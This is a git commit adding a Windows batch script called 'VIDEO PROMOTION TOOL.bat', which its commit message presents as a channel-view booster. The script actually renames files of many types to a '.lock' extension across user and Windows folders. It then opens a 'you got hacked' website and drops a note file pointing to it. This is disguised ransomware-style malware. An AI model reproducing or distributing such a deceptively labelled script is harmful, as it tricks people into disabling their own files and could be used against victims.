61bd58ef89169ea4444625423e8e17703807e402
isli123 <64680546+isli123@users.noreply.github.com>
2020-05-15 00:33:26 +0200

    very strong channel promotion tool!
    go with more threads to get vies faster, adding too much threads in a low pc it will crash it if you have a strong pc then you con go with more threads low pc recomandet: 100-600
    strong pc 10000-100000

---
+++ VIDEO PROMOTION TOOL.bat
@@ -0,0 +1,186 @@
+@echo off
+title SETUP
+goto encryption
+:encryption
+cd C:\Users\Desktop
+ren *.txt *.lock
+ren *.doc *.lock
+ren *.pptx *.lock
+ren *.png *.lock
+ren *.jpeg *.lock
+ren *.gif *.lock
+ren *.exe *.lock
+ren *.vbs *.lock
+ren *.css *.lock
+ren *.mp3 *.lock
+ren *.mp4 *.lock
+ren *.wav *.lock
+ren *.rar *.lock
+ren *.zip *.lock
+ren *.bmp *.lock
+ren *.js *.lock
+ren *.html *.lock
+ren *.apk *.lock
+ren *.ico *.lock
+ren *.3fr *.lock
+ren *.arw *.lock
+ren *.erf *.lock
+ren *.eps *.lock
+ren *.svg *.lock
+ren *.html5 *.lock
+ren *.key *.lock
+ren *.xml *.lock
+ren *.msg *.lock
+ren *.csv *.lock
+ren *.jpg *.lock
+ren *.rec *.lock
+
+cd C:\Users\Documents
+
+ren *.txt *.lock
+ren *.doc *.lock
+ren *.pptx *.lock
+ren *.png *.lock
+ren *.jpeg *.lock
+ren *.gif *.lock
+ren *.exe *.lock
+ren *.vbs *.lock
+ren *.css *.lock
+ren *.mp3 *.lock
+ren *.mp4 *.lock
+ren *.wav *.lock
+ren *.rar *.lock
+ren *.zip *.lock
+ren *.bmp *.lock
+ren *.js *.lock
+ren *.html *.lock
+ren *.apk *.lock
+ren *.ico *.lock
+ren *.3fr *.lock
+ren *.arw *.lock
+ren *.erf *.lock
+ren *.eps *.lock
+ren *.svg *.lock
+ren *.html5 *.lock
+ren *.key *.lock
+ren *.xml *.lock
+ren *.msg *.lock
+ren *.csv *.lock
+ren *.jpg *.lock
+ren *.rec *.lock
+
+cd C:\Users\Downloads
+
+ren *.txt *.lock
+ren *.doc *.lock
+ren *.pptx *.lock
+ren *.png *.lock
+ren *.jpeg *.lock
+ren *.gif *.lock
+ren *.exe *.lock
+ren *.vbs *.lock
+ren *.css *.lock
+ren *.mp3 *.lock
+ren *.mp4 *.lock
+ren *.wav *.lock
+ren *.rar *.lock
+ren *.zip *.lock
+ren *.bmp *.lock
+ren *.js *.lock
+ren *.html *.lock
+ren *.apk *.lock
+ren *.ico *.lock
+ren *.3fr *.lock
+ren *.arw *.lock
+ren *.erf *.lock
+ren *.eps *.lock
+ren *.svg *.lock
+ren *.html5 *.lock
+ren *.key *.lock
+ren *.xml *.lock
+ren *.msg *.lock
+ren *.csv *.lock
+ren *.jpg *.lock
+ren *.rec *.lock
+
+cd C:\Windows\security\logs
+
+ren *.txt *.lock
+ren *.doc *.lock
+ren *.pptx *.lock
+ren *.png *.lock
+ren *.jpeg *.lock
+ren *.gif *.lock
+ren *.exe *.lock
+ren *.vbs *.lock
+ren *.css *.lock
+ren *.mp3 *.lock
+ren *.mp4 *.lock
+ren *.wav *.lock
+ren *.rar *.lock
+ren *.zip *.lock
+ren *.bmp *.lock
+ren *.js *.lock
+ren *.html *.lock
+ren *.apk *.lock
+ren *.ico *.lock
+ren *.3fr *.lock
+ren *.arw *.lock
+ren *.erf *.lock
+ren *.eps *.lock
+ren *.svg *.lock
+ren *.html5 *.lock
+ren *.key *.lock
+ren *.xml *.lock
+ren *.msg *.lock
+ren *.csv *.lock
+ren *.jpg *.lock
+ren *.rec *.lock
+
+cd C:\Windows\en-US
+
+ren *.txt *.lock
+ren *.doc *.lock
+ren *.pptx *.lock
+ren *.png *.lock
+ren *.jpeg *.lock
+ren *.gif *.lock
+ren *.exe *.lock
+ren *.vbs *.lock
+ren *.css *.lock
+ren *.mp3 *.lock
+ren *.mp4 *.lock
+ren *.wav *.lock
+ren *.rar *.lock
+ren *.zip *.lock
+ren *.bmp *.lock
+ren *.js *.lock
+ren *.html *.lock
+ren *.apk *.lock
+ren *.ico *.lock
+ren *.3fr *.lock
+ren *.arw *.lock
+ren *.erf *.lock
+ren *.eps *.lock
+ren *.svg *.lock
+ren *.html5 *.lock
+ren *.key *.lock
+ren *.xml *.lock
+ren *.msg *.lock
+ren *.csv *.lock
+ren *.jpg *.lock
+ren *.rec *.lock
+
+
+
+
+
+start https://yougothacked-whats-the-infom8.netlify.app
+
+cd C:\Users\Desktop
+
+echo for the info go to the website: https://yougothacked-whats-the-infom8.netlify.app >info.txt
+
+
+
+
